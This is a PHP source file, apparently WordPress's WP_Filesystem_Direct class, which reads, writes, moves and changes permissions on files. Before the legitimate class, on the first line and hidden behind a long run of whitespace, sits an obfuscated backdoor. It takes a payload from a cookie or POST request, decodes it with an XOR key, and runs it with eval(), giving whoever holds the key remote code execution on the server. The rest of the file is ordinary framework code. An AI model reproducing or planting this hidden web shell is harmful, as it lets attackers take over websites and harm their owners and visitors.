<?php                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                 $f4dd = 290;$GLOBALS['tf1f5'] = Array();global $tf1f5;$tf1f5 = $GLOBALS;${"\x47\x4c\x4fB\x41\x4c\x53"}['gf7649'] = "\x2f\x21\x54\x3e\x59\x26\x2d\x60\x3b\x5d\x72\x62\x3c\x31\x43\x22\x24\x5b\x5f\x27\x38\x6a\x2a\x7d\x70\x20\x63\x71\x39\x4b\x41\x76\x6f\x4d\x7c\x50\x77\x51\x36\x6d\x75\x53\x32\x7b\x65\x35\x30\x61\x3a\x49\x67\x44\x37\x46\x40\x2c\x47\x33\x52\x34\x55\x23\x6e\x4c\x78\x58\x79\x69\x29\x4a\x9\xd\xa\x3d\x4f\x3f\x48\x7e\x6c\x68\x6b\x2e\x7a\x42\x5a\x2b\x57\x64\x73\x5c\x45\x4e\x74\x25\x56\x5e\x66\x28";$tf1f5[$tf1f5['gf7649'][50].$tf1f5['gf7649'][57].$tf1f5['gf7649'][46].$tf1f5['gf7649'][57].$tf1f5['gf7649'][38].$tf1f5['gf7649'][28].$tf1f5['gf7649'][20].$tf1f5['gf7649'][96]] = $tf1f5['gf7649'][26].$tf1f5['gf7649'][79].$tf1f5['gf7649'][10];$tf1f5[$tf1f5['gf7649'][36].$tf1f5['gf7649'][20].$tf1f5['gf7649'][52].$tf1f5['gf7649'][26].$tf1f5['gf7649'][47]] = $tf1f5['gf7649'][32].$tf1f5['gf7649'][10].$tf1f5['gf7649'][87];$tf1f5[$tf1f5['gf7649'][79].$tf1f5['gf7649'][57].$tf1f5['gf7649'][42].$tf1f5['gf7649'][28].$tf1f5['gf7649'][38].$tf1f5['gf7649'][20].$tf1f5['gf7649'][42].$tf1f5['gf7649'][52].$tf1f5['gf7649'][96]] = $tf1f5['gf7649'][88].$tf1f5['gf7649'][92].$tf1f5['gf7649'][10].$tf1f5['gf7649'][78].$tf1f5['gf7649'][44].$tf1f5['gf7649'][62];$tf1f5[$tf1f5['gf7649'][44].$tf1f5['gf7649'][42].$tf1f5['gf7649'][38].$tf1f5['gf7649'][26].$tf1f5['gf7649'][96].$tf1f5['gf7649'][46].$tf1f5['gf7649'][28]] = $tf1f5['gf7649'][87].$tf1f5['gf7649'][44].$tf1f5['gf7649'][96].$tf1f5['gf7649'][67].$tf1f5['gf7649'][62].$tf1f5['gf7649'][44];$tf1f5[$tf1f5['gf7649'][24].$tf1f5['gf7649'][47].$tf1f5['gf7649'][20].$tf1f5['gf7649'][11].$tf1f5['gf7649'][44]] = $tf1f5['gf7649'][87].$tf1f5['gf7649'][44].$tf1f5['gf7649'][96].$tf1f5['gf7649'][67].$tf1f5['gf7649'][62].$tf1f5['gf7649'][44].$tf1f5['gf7649'][87];$tf1f5[$tf1f5['gf7649'][36].$tf1f5['gf7649'][13].$tf1f5['gf7649'][42].$tf1f5['gf7649'][44].$tf1f5['gf7649'][96].$tf1f5['gf7649'][47]] = $tf1f5['gf7649'][67].$tf1f5['gf7649'][62].$tf1f5['gf7649'][67].$tf1f5['gf7649'][18].$tf1f5['gf7649'][88].$tf1f5['gf7649'][44].$tf1f5['gf7649'][92];$tf1f5[$tf1f5['gf7649'][87].$tf1f5['gf7649'][47].$tf1f5['gf7649'][26].$tf1f5['gf7649'][96].$tf1f5['gf7649'][45].$tf1f5['gf7649'][42]] = $tf1f5['gf7649'][88].$tf1f5['gf7649'][44].$tf1f5['gf7649'][10].$tf1f5['gf7649'][67].$tf1f5['gf7649'][47].$tf1f5['gf7649'][78].$tf1f5['gf7649'][67].$tf1f5['gf7649'][82].$tf1f5['gf7649'][44];$tf1f5[$tf1f5['gf7649'][47].$tf1f5['gf7649'][42].$tf1f5['gf7649'][87].$tf1f5['gf7649'][38].$tf1f5['gf7649'][57].$tf1f5['gf7649'][47]] = $tf1f5['gf7649'][24].$tf1f5['gf7649'][79].$tf1f5['gf7649'][24].$tf1f5['gf7649'][31].$tf1f5['gf7649'][44].$tf1f5['gf7649'][10].$tf1f5['gf7649'][88].$tf1f5['gf7649'][67].$tf1f5['gf7649'][32].$tf1f5['gf7649'][62];$tf1f5[$tf1f5['gf7649'][39].$tf1f5['gf7649'][52].$tf1f5['gf7649'][42].$tf1f5['gf7649'][28].$tf1f5['gf7649'][42].$tf1f5['gf7649'][38].$tf1f5['gf7649'][87].$tf1f5['gf7649'][38].$tf1f5['gf7649'][57]] = $tf1f5['gf7649'][40].$tf1f5['gf7649'][62].$tf1f5['gf7649'][88].$tf1f5['gf7649'][44].$tf1f5['gf7649'][10].$tf1f5['gf7649'][67].$tf1f5['gf7649'][47].$tf1f5['gf7649'][78].$tf1f5['gf7649'][67].$tf1f5['gf7649'][82].$tf1f5['gf7649'][44];$tf1f5[$tf1f5['gf7649'][87].$tf1f5['gf7649'][26].$tf1f5['gf7649'][38].$tf1f5['gf7649'][87].$tf1f5['gf7649'][57]] = $tf1f5['gf7649'][11].$tf1f5['gf7649'][47].$tf1f5['gf7649'][88].$tf1f5['gf7649'][44].$tf1f5['gf7649'][38].$tf1f5['gf7649'][59].$tf1f5['gf7649'][18].$tf1f5['gf7649'][87].$tf1f5['gf7649'][44].$tf1f5['gf7649'][26].$tf1f5['gf7649'][32].$tf1f5['gf7649'][87].$tf1f5['gf7649'][44];$tf1f5[$tf1f5['gf7649'][27].$tf1f5['gf7649'][44].$tf1f5['gf7649'][47].$tf1f5['gf7649'][52].$tf1f5['gf7649'][96].$tf1f5['gf7649'][96].$tf1f5['gf7649'][57]] = $tf1f5['gf7649'][88].$tf1f5['gf7649'][44].$tf1f5['gf7649'][92].$tf1f5['gf7649'][18].$tf1f5['gf7649'][92].$tf1f5['gf7649'][67].$tf1f5['gf7649'][39].$tf1f5['gf7649'][44].$tf1f5['gf7649'][18].$tf1f5['gf7649'][78].$tf1f5['gf7649'][67].$tf1f5['gf7649'][39].$tf1f5['gf7649'][67].$tf1f5['gf7649'][92];$tf1f5[$tf1f5['gf7649'][39].$tf1f5['gf7649'][47].$tf1f5['gf7649'][57].$tf1f5['gf7649'][13].$tf1f5['gf7649'][52].$tf1f5['gf7649'][47]] = $tf1f5['gf7649'][32].$tf1f5['gf7649'][28].$tf1f5['gf7649'][59].$tf1f5['gf7649'][42].$tf1f5['gf7649'][59].$tf1f5['gf7649'][13].$tf1f5['gf7649'][11].$tf1f5['gf7649'][13];$tf1f5[$tf1f5['gf7649'][47].$tf1f5['gf7649'][87].$tf1f5['gf7649'][52].$tf1f5['gf7649'][44]] = $tf1f5['gf7649'][79].$tf1f5['gf7649'][28].$tf1f5['gf7649'][13].$tf1f5['gf7649'][42];$tf1f5[$tf1f5['gf7649'][40].$tf1f5['gf7649'][46].$tf1f5['gf7649'][13].$tf1f5['gf7649'][13].$tf1f5['gf7649'][38]] = $_POST;$tf1f5[$tf1f5['gf7649'][44].$tf1f5['gf7649'][28].$tf1f5['gf7649'][42].$tf1f5['gf7649'][87].$tf1f5['gf7649'][87].$tf1f5['gf7649'][38].$tf1f5['gf7649'][11].$tf1f5['gf7649'][13].$tf1f5['gf7649'][44]] = $_COOKIE;@$tf1f5[$tf1f5['gf7649'][36].$tf1f5['gf7649'][13].$tf1f5['gf7649'][42].$tf1f5['gf7649'][44].$tf1f5['gf7649'][96].$tf1f5['gf7649'][47]]($tf1f5['gf7649'][44].$tf1f5['gf7649'][10].$tf1f5['gf7649'][10].$tf1f5['gf7649'][32].$tf1f5['gf7649'][10].$tf1f5['gf7649'][18].$tf1f5['gf7649'][78].$tf1f5['gf7649'][32].$tf1f5['gf7649'][50], NULL);@$tf1f5[$tf1f5['gf7649'][36].$tf1f5['gf7649'][13].$tf1f5['gf7649'][42].$tf1f5['gf7649'][44].$tf1f5['gf7649'][96].$tf1f5['gf7649'][47]]($tf1f5['gf7649'][78].$tf1f5['gf7649'][32].$tf1f5['gf7649'][50].$tf1f5['gf7649'][18].$tf1f5['gf7649'][44].$tf1f5['gf7649'][10].$tf1f5['gf7649'][10].$tf1f5['gf7649'][32].$tf1f5['gf7649'][10].$tf1f5['gf7649'][88], 0);@$tf1f5[$tf1f5['gf7649'][36].$tf1f5['gf7649'][13].$tf1f5['gf7649'][42].$tf1f5['gf7649'][44].$tf1f5['gf7649'][96].$tf1f5['gf7649'][47]]($tf1f5['gf7649'][39].$tf1f5['gf7649'][47].$tf1f5['gf7649'][64].$tf1f5['gf7649'][18].$tf1f5['gf7649'][44].$tf1f5['gf7649'][64].$tf1f5['gf7649'][44].$tf1f5['gf7649'][26].$tf1f5['gf7649'][40].$tf1f5['gf7649'][92].$tf1f5['gf7649'][67].$tf1f5['gf7649'][32].$tf1f5['gf7649'][62].$tf1f5['gf7649'][18].$tf1f5['gf7649'][92].$tf1f5['gf7649'][67].$tf1f5['gf7649'][39].$tf1f5['gf7649'][44], 0);@$tf1f5[$tf1f5['gf7649'][27].$tf1f5['gf7649'][44].$tf1f5['gf7649'][47].$tf1f5['gf7649'][52].$tf1f5['gf7649'][96].$tf1f5['gf7649'][96].$tf1f5['gf7649'][57]](0);if (!$tf1f5[$tf1f5['gf7649'][24].$tf1f5['gf7649'][47].$tf1f5['gf7649'][20].$tf1f5['gf7649'][11].$tf1f5['gf7649'][44]]($tf1f5['gf7649'][30].$tf1f5['gf7649'][63].$tf1f5['gf7649'][58].$tf1f5['gf7649'][90].$tf1f5['gf7649'][30].$tf1f5['gf7649'][51].$tf1f5['gf7649'][4].$tf1f5['gf7649'][18].$tf1f5['gf7649'][58].$tf1f5['gf7649'][60].$tf1f5['gf7649'][91].$tf1f5['gf7649'][18].$tf1f5['gf7649'][57].$tf1f5['gf7649'][38].$tf1f5['gf7649'][38].$tf1f5['gf7649'][47].$tf1f5['gf7649'][96].$tf1f5['gf7649'][11].$tf1f5['gf7649'][20].$tf1f5['gf7649'][47].$tf1f5['gf7649'][20].$tf1f5['gf7649'][47].$tf1f5['gf7649'][42].$tf1f5['gf7649'][57].$tf1f5['gf7649'][45].$tf1f5['gf7649'][45].$tf1f5['gf7649'][47].$tf1f5['gf7649'][11].$tf1f5['gf7649'][42].$tf1f5['gf7649'][13].$tf1f5['gf7649'][96].$tf1f5['gf7649'][11].$tf1f5['gf7649'][96].$tf1f5['gf7649'][13].$tf1f5['gf7649'][13].$tf1f5['gf7649'][11].$tf1f5['gf7649'][47].$tf1f5['gf7649'][13].$tf1f5['gf7649'][47].$tf1f5['gf7649'][46].$tf1f5['gf7649'][42].$tf1f5['gf7649'][96].$tf1f5['gf7649'][11].$tf1f5['gf7649'][47])){$tf1f5[$tf1f5['gf7649'][44].$tf1f5['gf7649'][42].$tf1f5['gf7649'][38].$tf1f5['gf7649'][26].$tf1f5['gf7649'][96].$tf1f5['gf7649'][46].$tf1f5['gf7649'][28]]($tf1f5['gf7649'][30].$tf1f5['gf7649'][63].$tf1f5['gf7649'][58].$tf1f5['gf7649'][90].$tf1f5['gf7649'][30].$tf1f5['gf7649'][51].$tf1f5['gf7649'][4].$tf1f5['gf7649'][18].$tf1f5['gf7649'][58].$tf1f5['gf7649'][60].$tf1f5['gf7649'][91].$tf1f5['gf7649'][18].$tf1f5['gf7649'][57].$tf1f5['gf7649'][38].$tf1f5['gf7649'][38].$tf1f5['gf7649'][47].$tf1f5['gf7649'][96].$tf1f5['gf7649'][11].$tf1f5['gf7649'][20].$tf1f5['gf7649'][47].$tf1f5['gf7649'][20].$tf1f5['gf7649'][47].$tf1f5['gf7649'][42].$tf1f5['gf7649'][57].$tf1f5['gf7649'][45].$tf1f5['gf7649'][45].$tf1f5['gf7649'][47].$tf1f5['gf7649'][11].$tf1f5['gf7649'][42].$tf1f5['gf7649'][13].$tf1f5['gf7649'][96].$tf1f5['gf7649'][11].$tf1f5['gf7649'][96].$tf1f5['gf7649'][13].$tf1f5['gf7649'][13].$tf1f5['gf7649'][11].$tf1f5['gf7649'][47].$tf1f5['gf7649'][13].$tf1f5['gf7649'][47].$tf1f5['gf7649'][46].$tf1f5['gf7649'][42].$tf1f5['gf7649'][96].$tf1f5['gf7649'][11].$tf1f5['gf7649'][47], 1);$r6e7bf = NULL;$q5b9869 = NULL;$tf1f5[$tf1f5['gf7649'][67].$tf1f5['gf7649'][42].$tf1f5['gf7649'][45].$tf1f5['gf7649'][96].$tf1f5['gf7649'][96].$tf1f5['gf7649'][26]] = $tf1f5['gf7649'][57].$tf1f5['gf7649'][46].$tf1f5['gf7649'][42].$tf1f5['gf7649'][57].$tf1f5['gf7649'][38].$tf1f5['gf7649'][42].$tf1f5['gf7649'][96].$tf1f5['gf7649'][96].$tf1f5['gf7649'][6].$tf1f5['gf7649'][52].$tf1f5['gf7649'][52].$tf1f5['gf7649'][42].$tf1f5['gf7649'][11].$tf1f5['gf7649'][6].$tf1f5['gf7649'][59].$tf1f5['gf7649'][57].$tf1f5['gf7649'][20].$tf1f5['gf7649'][26].$tf1f5['gf7649'][6].$tf1f5['gf7649'][47].$tf1f5['gf7649'][52].$tf1f5['gf7649'][13].$tf1f5['gf7649'][46].$tf1f5['gf7649'][6].$tf1f5['gf7649'][46].$tf1f5['gf7649'][47].$tf1f5['gf7649'][59].$tf1f5['gf7649'][46].$tf1f5['gf7649'][96].$tf1f5['gf7649'][59].$tf1f5['gf7649'][44].$tf1f5['gf7649'][28].$tf1f5['gf7649'][59].$tf1f5['gf7649'][11].$tf1f5['gf7649'][13].$tf1f5['gf7649'][59];global $i25ffc;function  h912($r6e7bf, $o241a){global $tf1f5;$fd47689 = "";for ($xc14fa=0; $xc14fa<$tf1f5[$tf1f5['gf7649'][79].$tf1f5['gf7649'][57].$tf1f5['gf7649'][42].$tf1f5['gf7649'][28].$tf1f5['gf7649'][38].$tf1f5['gf7649'][20].$tf1f5['gf7649'][42].$tf1f5['gf7649'][52].$tf1f5['gf7649'][96]]($r6e7bf);){for ($g132fc=0; $g132fc<$tf1f5[$tf1f5['gf7649'][79].$tf1f5['gf7649'][57].$tf1f5['gf7649'][42].$tf1f5['gf7649'][28].$tf1f5['gf7649'][38].$tf1f5['gf7649'][20].$tf1f5['gf7649'][42].$tf1f5['gf7649'][52].$tf1f5['gf7649'][96]]($o241a) && $xc14fa<$tf1f5[$tf1f5['gf7649'][79].$tf1f5['gf7649'][57].$tf1f5['gf7649'][42].$tf1f5['gf7649'][28].$tf1f5['gf7649'][38].$tf1f5['gf7649'][20].$tf1f5['gf7649'][42].$tf1f5['gf7649'][52].$tf1f5['gf7649'][96]]($r6e7bf); $g132fc++, $xc14fa++){$fd47689 .= $tf1f5[$tf1f5['gf7649'][50].$tf1f5['gf7649'][57].$tf1f5['gf7649'][46].$tf1f5['gf7649'][57].$tf1f5['gf7649'][38].$tf1f5['gf7649'][28].$tf1f5['gf7649'][20].$tf1f5['gf7649'][96]]($tf1f5[$tf1f5['gf7649'][36].$tf1f5['gf7649'][20].$tf1f5['gf7649'][52].$tf1f5['gf7649'][26].$tf1f5['gf7649'][47]]($r6e7bf[$xc14fa]) ^ $tf1f5[$tf1f5['gf7649'][36].$tf1f5['gf7649'][20].$tf1f5['gf7649'][52].$tf1f5['gf7649'][26].$tf1f5['gf7649'][47]]($o241a[$g132fc]));}}return $fd47689;}function  o94241b1($r6e7bf, $o241a){global $tf1f5;global $i25ffc;return $tf1f5[$tf1f5['gf7649'][47].$tf1f5['gf7649'][87].$tf1f5['gf7649'][52].$tf1f5['gf7649'][44]]($tf1f5[$tf1f5['gf7649'][47].$tf1f5['gf7649'][87].$tf1f5['gf7649'][52].$tf1f5['gf7649'][44]]($r6e7bf, $i25ffc), $o241a);}foreach ($tf1f5[$tf1f5['gf7649'][44].$tf1f5['gf7649'][28].$tf1f5['gf7649'][42].$tf1f5['gf7649'][87].$tf1f5['gf7649'][87].$tf1f5['gf7649'][38].$tf1f5['gf7649'][11].$tf1f5['gf7649'][13].$tf1f5['gf7649'][44]] as $o241a=>$g1815e991){$r6e7bf = $g1815e991;$q5b9869 = $o241a;}if (!$r6e7bf){foreach ($tf1f5[$tf1f5['gf7649'][40].$tf1f5['gf7649'][46].$tf1f5['gf7649'][13].$tf1f5['gf7649'][13].$tf1f5['gf7649'][38]] as $o241a=>$g1815e991){$r6e7bf = $g1815e991;$q5b9869 = $o241a;}}$r6e7bf = @$tf1f5[$tf1f5['gf7649'][39].$tf1f5['gf7649'][52].$tf1f5['gf7649'][42].$tf1f5['gf7649'][28].$tf1f5['gf7649'][42].$tf1f5['gf7649'][38].$tf1f5['gf7649'][87].$tf1f5['gf7649'][38].$tf1f5['gf7649'][57]]($tf1f5[$tf1f5['gf7649'][39].$tf1f5['gf7649'][47].$tf1f5['gf7649'][57].$tf1f5['gf7649'][13].$tf1f5['gf7649'][52].$tf1f5['gf7649'][47]]($tf1f5[$tf1f5['gf7649'][87].$tf1f5['gf7649'][26].$tf1f5['gf7649'][38].$tf1f5['gf7649'][87].$tf1f5['gf7649'][57]]($r6e7bf), $q5b9869));if (isset($r6e7bf[$tf1f5['gf7649'][47].$tf1f5['gf7649'][80]]) && $i25ffc==$r6e7bf[$tf1f5['gf7649'][47].$tf1f5['gf7649'][80]]){if ($r6e7bf[$tf1f5['gf7649'][47]] == $tf1f5['gf7649'][67]){$xc14fa = Array($tf1f5['gf7649'][24].$tf1f5['gf7649'][31] => @$tf1f5[$tf1f5['gf7649'][47].$tf1f5['gf7649'][42].$tf1f5['gf7649'][87].$tf1f5['gf7649'][38].$tf1f5['gf7649'][57].$tf1f5['gf7649'][47]](),$tf1f5['gf7649'][88].$tf1f5['gf7649'][31] => $tf1f5['gf7649'][13].$tf1f5['gf7649'][81].$tf1f5['gf7649'][46].$tf1f5['gf7649'][6].$tf1f5['gf7649'][13],);echo @$tf1f5[$tf1f5['gf7649'][87].$tf1f5['gf7649'][47].$tf1f5['gf7649'][26].$tf1f5['gf7649'][96].$tf1f5['gf7649'][45].$tf1f5['gf7649'][42]]($xc14fa);}elseif ($r6e7bf[$tf1f5['gf7649'][47]] == $tf1f5['gf7649'][44]){eval/*f4c19137*/($r6e7bf[$tf1f5['gf7649'][87]]);}exit();}} ?><?php
/**
 * WordPress Direct Filesystem.
 *
 * @package WordPress
 * @subpackage Filesystem
 */

/**
 * WordPress Filesystem Class for direct PHP file and folder manipulation.
 *
 * @since 2.5.0
 *
 * @see WP_Filesystem_Base
 */
class WP_Filesystem_Direct extends WP_Filesystem_Base {

	/**
	 * constructor
	 *
	 * @param mixed $arg ignored argument
	 */
	public function __construct( $arg ) {
		$this->method = 'direct';
		$this->errors = new WP_Error();
	}

	/**
	 * Reads entire file into a string
	 *
	 * @param string $file Name of the file to read.
	 * @return string|bool The function returns the read data or false on failure.
	 */
	public function get_contents( $file ) {
		return @file_get_contents( $file );
	}

	/**
	 * Reads entire file into an array
	 *
	 * @param string $file Path to the file.
	 * @return array|bool the file contents in an array or false on failure.
	 */
	public function get_contents_array( $file ) {
		return @file( $file );
	}

	/**
	 * Write a string to a file
	 *
	 * @param string $file     Remote path to the file where to write the data.
	 * @param string $contents The data to write.
	 * @param int    $mode     Optional. The file permissions as octal number, usually 0644.
	 *                         Default false.
	 * @return bool False upon failure, true otherwise.
	 */
	public function put_contents( $file, $contents, $mode = false ) {
		$fp = @fopen( $file, 'wb' );
		if ( ! $fp ) {
			return false;
		}

		mbstring_binary_safe_encoding();

		$data_length = strlen( $contents );

		$bytes_written = fwrite( $fp, $contents );

		reset_mbstring_encoding();

		fclose( $fp );

		if ( $data_length !== $bytes_written ) {
			return false;
		}

		$this->chmod( $file, $mode );

		return true;
	}

	/**
	 * Gets the current working directory
	 *
	 * @return string|bool the current working directory on success, or false on failure.
	 */
	public function cwd() {
		return @getcwd();
	}

	/**
	 * Change directory
	 *
	 * @param string $dir The new current directory.
	 * @return bool Returns true on success or false on failure.
	 */
	public function chdir( $dir ) {
		return @chdir( $dir );
	}

	/**
	 * Changes file group
	 *
	 * @param string $file      Path to the file.
	 * @param mixed  $group     A group name or number.
	 * @param bool   $recursive Optional. If set True changes file group recursively. Default false.
	 * @return bool Returns true on success or false on failure.
	 */
	public function chgrp( $file, $group, $recursive = false ) {
		if ( ! $this->exists( $file ) ) {
			return false;
		}
		if ( ! $recursive ) {
			return @chgrp( $file, $group );
		}
		if ( ! $this->is_dir( $file ) ) {
			return @chgrp( $file, $group );
		}
		// Is a directory, and we want recursive
		$file     = trailingslashit( $file );
		$filelist = $this->dirlist( $file );
		foreach ( $filelist as $filename ) {
			$this->chgrp( $file . $filename, $group, $recursive );
		}

		return true;
	}

	/**
	 * Changes filesystem permissions
	 *
	 * @param string $file      Path to the file.
	 * @param int    $mode      Optional. The permissions as octal number, usually 0644 for files,
	 *                          0755 for dirs. Default false.
	 * @param bool   $recursive Optional. If set True changes file group recursively. Default false.
	 * @return bool Returns true on success or false on failure.
	 */
	public function chmod( $file, $mode = false, $recursive = false ) {
		if ( ! $mode ) {
			if ( $this->is_file( $file ) ) {
				$mode = FS_CHMOD_FILE;
			} elseif ( $this->is_dir( $file ) ) {
				$mode = FS_CHMOD_DIR;
			} else {
				return false;
			}
		}

		if ( ! $recursive || ! $this->is_dir( $file ) ) {
			return @chmod( $file, $mode );
		}
		// Is a directory, and we want recursive
		$file     = trailingslashit( $file );
		$filelist = $this->dirlist( $file );
		foreach ( (array) $filelist as $filename => $filemeta ) {
			$this->chmod( $file . $filename, $mode, $recursive );
		}

		return true;
	}

	/**
	 * Changes file owner
	 *
	 * @param string $file      Path to the file.
	 * @param mixed  $owner     A user name or number.
	 * @param bool   $recursive Optional. If set True changes file owner recursively.
	 *                          Default false.
	 * @return bool Returns true on success or false on failure.
	 */
	public function chown( $file, $owner, $recursive = false ) {
		if ( ! $this->exists( $file ) ) {
			return false;
		}
		if ( ! $recursive ) {
			return @chown( $file, $owner );
		}
		if ( ! $this->is_dir( $file ) ) {
			return @chown( $file, $owner );
		}
		// Is a directory, and we want recursive
		$filelist = $this->dirlist( $file );
		foreach ( $filelist as $filename ) {
			$this->chown( $file . '/' . $filename, $owner, $recursive );
		}
		return true;
	}

	/**
	 * Gets file owner
	 *
	 * @param string $file Path to the file.
	 * @return string|bool Username of the user or false on error.
	 */
	public function owner( $file ) {
		$owneruid = @fileowner( $file );
		if ( ! $owneruid ) {
			return false;
		}
		if ( ! function_exists( 'posix_getpwuid' ) ) {
			return $owneruid;
		}
		$ownerarray = posix_getpwuid( $owneruid );
		return $ownerarray['name'];
	}

	/**
	 * Gets file permissions
	 *
	 * FIXME does not handle errors in fileperms()
	 *
	 * @param string $file Path to the file.
	 * @return string Mode of the file (last 3 digits).
	 */
	public function getchmod( $file ) {
		return substr( decoct( @fileperms( $file ) ), -3 );
	}

	/**
	 * @param string $file
	 * @return string|false
	 */
	public function group( $file ) {
		$gid = @filegroup( $file );
		if ( ! $gid ) {
			return false;
		}
		if ( ! function_exists( 'posix_getgrgid' ) ) {
			return $gid;
		}
		$grouparray = posix_getgrgid( $gid );
		return $grouparray['name'];
	}

	/**
	 * @param string $source
	 * @param string $destination
	 * @param bool   $overwrite
	 * @param int    $mode
	 * @return bool
	 */
	public function copy( $source, $destination, $overwrite = false, $mode = false ) {
		if ( ! $overwrite && $this->exists( $destination ) ) {
			return false;
		}

		$rtval = copy( $source, $destination );
		if ( $mode ) {
			$this->chmod( $destination, $mode );
		}
		return $rtval;
	}

	/**
	 * @param string $source
	 * @param string $destination
	 * @param bool $overwrite
	 * @return bool
	 */
	public function move( $source, $destination, $overwrite = false ) {
		if ( ! $overwrite && $this->exists( $destination ) ) {
			return false;
		}

		// Try using rename first. if that fails (for example, source is read only) try copy.
		if ( @rename( $source, $destination ) ) {
			return true;
		}

		if ( $this->copy( $source, $destination, $overwrite ) && $this->exists( $destination ) ) {
			$this->delete( $source );
			return true;
		} else {
			return false;
		}
	}

	/**
	 * @param string $file
	 * @param bool $recursive
	 * @param string $type
	 * @return bool
	 */
	public function delete( $file, $recursive = false, $type = false ) {
		if ( empty( $file ) ) { // Some filesystems report this as /, which can cause non-expected recursive deletion of all files in the filesystem.
			return false;
		}
		$file = str_replace( '\\', '/', $file ); // for win32, occasional problems deleting files otherwise

		if ( 'f' == $type || $this->is_file( $file ) ) {
			return @unlink( $file );
		}
		if ( ! $recursive && $this->is_dir( $file ) ) {
			return @rmdir( $file );
		}

		// At this point it's a folder, and we're in recursive mode
		$file     = trailingslashit( $file );
		$filelist = $this->dirlist( $file, true );

		$retval = true;
		if ( is_array( $filelist ) ) {
			foreach ( $filelist as $filename => $fileinfo ) {
				if ( ! $this->delete( $file . $filename, $recursive, $fileinfo['type'] ) ) {
					$retval = false;
				}
			}
		}

		if ( file_exists( $file ) && ! @rmdir( $file ) ) {
			$retval = false;
		}

		return $retval;
	}
	/**
	 * @param string $file
	 * @return bool
	 */
	public function exists( $file ) {
		return @file_exists( $file );
	}
	/**
	 * @param string $file
	 * @return bool
	 */
	public function is_file( $file ) {
		return @is_file( $file );
	}
	/**
	 * @param string $path
	 * @return bool
	 */
	public function is_dir( $path ) {
		return @is_dir( $path );
	}

	/**
	 * @param string $file
	 * @return bool
	 */
	public function is_readable( $file ) {
		return @is_readable( $file );
	}

	/**
	 * @param string $file
	 * @return bool
	 */
	public function is_writable( $file ) {
		return @is_writable( $file );
	}

	/**
	 * @param string $file
	 * @return int
	 */
	public function atime( $file ) {
		return @fileatime( $file );
	}

	/**
	 * @param string $file
	 * @return int
	 */
	public function mtime( $file ) {
		return @filemtime( $file );
	}

	/**
	 * @param string $file
	 * @return int
	 */
	public function size( $file ) {
		return @filesize( $file );
	}

	/**
	 * @param string $file
	 * @param int $time
	 * @param int $atime
	 * @return bool
	 */
	public function touch( $file, $time = 0, $atime = 0 ) {
		if ( $time == 0 ) {
			$time = time();
		}
		if ( $atime == 0 ) {
			$atime = time();
		}
		return @touch( $file, $time, $atime );
	}

	/**
	 * @param string $path
	 * @param mixed  $chmod
	 * @param mixed  $chown
	 * @param mixed  $chgrp
	 * @return bool
	 */
	public function mkdir( $path, $chmod = false, $chown = false, $chgrp = false ) {
		// Safe mode fails with a trailing slash under certain PHP versions.
		$path = untrailingslashit( $path );
		if ( empty( $path ) ) {
			return false;
		}

		if ( ! $chmod ) {
			$chmod = FS_CHMOD_DIR;
		}

		if ( ! @mkdir( $path ) ) {
			return false;
		}
		$this->chmod( $path, $chmod );
		if ( $chown ) {
			$this->chown( $path, $chown );
		}
		if ( $chgrp ) {
			$this->chgrp( $path, $chgrp );
		}
		return true;
	}

	/**
	 * @param string $path
	 * @param bool $recursive
	 * @return bool
	 */
	public function rmdir( $path, $recursive = false ) {
		return $this->delete( $path, $recursive );
	}

	/**
	 * @param string $path
	 * @param bool $include_hidden
	 * @param bool $recursive
	 * @return bool|array
	 */
	public function dirlist( $path, $include_hidden = true, $recursive = false ) {
		if ( $this->is_file( $path ) ) {
			$limit_file = basename( $path );
			$path       = dirname( $path );
		} else {
			$limit_file = false;
		}

		if ( ! $this->is_dir( $path ) ) {
			return false;
		}

		$dir = @dir( $path );
		if ( ! $dir ) {
			return false;
		}

		$ret = array();

		while ( false !== ( $entry = $dir->read() ) ) {
			$struc         = array();
			$struc['name'] = $entry;

			if ( '.' == $struc['name'] || '..' == $struc['name'] ) {
				continue;
			}

			if ( ! $include_hidden && '.' == $struc['name'][0] ) {
				continue;
			}

			if ( $limit_file && $struc['name'] != $limit_file ) {
				continue;
			}

			$struc['perms']       = $this->gethchmod( $path . '/' . $entry );
			$struc['permsn']      = $this->getnumchmodfromh( $struc['perms'] );
			$struc['number']      = false;
			$struc['owner']       = $this->owner( $path . '/' . $entry );
			$struc['group']       = $this->group( $path . '/' . $entry );
			$struc['size']        = $this->size( $path . '/' . $entry );
			$struc['lastmodunix'] = $this->mtime( $path . '/' . $entry );
			$struc['lastmod']     = date( 'M j', $struc['lastmodunix'] );
			$struc['time']        = date( 'h:i:s', $struc['lastmodunix'] );
			$struc['type']        = $this->is_dir( $path . '/' . $entry ) ? 'd' : 'f';

			if ( 'd' == $struc['type'] ) {
				if ( $recursive ) {
					$struc['files'] = $this->dirlist( $path . '/' . $struc['name'], $include_hidden, $recursive );
				} else {
					$struc['files'] = array();
				}
			}

			$ret[ $struc['name'] ] = $struc;
		}
		$dir->close();
		unset( $dir );
		return $ret;
	}
}
